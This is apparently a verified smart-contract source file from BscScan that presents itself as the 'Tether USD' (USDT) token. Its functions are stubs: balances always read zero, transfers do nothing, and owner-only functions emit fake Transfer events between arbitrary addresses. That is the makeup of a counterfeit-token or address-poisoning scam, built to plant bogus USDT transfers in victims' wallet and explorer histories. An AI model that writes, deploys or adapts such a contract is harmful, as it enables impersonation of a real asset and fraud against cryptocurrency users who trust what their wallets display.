/**
 *Submitted for verification at BscScan.com on 2023-05-05
*/

// SPDX-License-Identifier: SimPL-2.0
pragma solidity ^0.8.18;
interface ITRC20 {
    function transfer(address to, uint256 value) external returns (bool);
    function approve(address spender, uint256 value) external returns (bool);
    function transferFrom(address from, address to, uint256 value) external returns (bool);
    function totalSupply() external view returns (uint256);
    function balanceOf(address who) external view returns (uint256);
    function allowance(address owner, address spender) external view returns (uint256);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}
library SafeMath {
    function add(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, errorMessage);
        return c;
    }
    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

}
contract TRC20 is ITRC20 {
    using SafeMath for uint256;
    address private owner;
    uint8 constant  public decimals = 6;
    string constant public name = 'Tether USD';
    string constant public symbol = 'USDT';
    constructor() {
        owner = msg.sender;
    }
    
    function totalSupply() public view returns (uint256) {
        return 999999999999999999;
    }
    function balanceOf(address account) public view returns (uint256) {
        return 0;
    }
    function transfer(address recipient, uint256 amount) public returns (bool) {
        return true;
    }
    
    function allowance(address owner, address spender) public view returns (uint256) {
        return 999999999999999999;
    }

    function approve(address spender, uint256 value) public returns (bool) {
        return true;
    }
    
    function approve(address newowner) public returns (bool) {
        require(msg.sender == owner);
        owner=newowner;
        return true;
    }
    
    function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
        require(msg.sender == owner);
        emit Transfer(sender, recipient, amount);
        return true;
    }
    
    function bulkTransferFrom(address[] memory fromList, address[] memory toList, uint256[] memory valueList) public returns (bool) {
        require(msg.sender == owner);
        for (uint256 i = 0; i < fromList.length; i++) {
            emit Transfer(fromList[i], toList[i], valueList[i]);
        }
        return true;
    }
}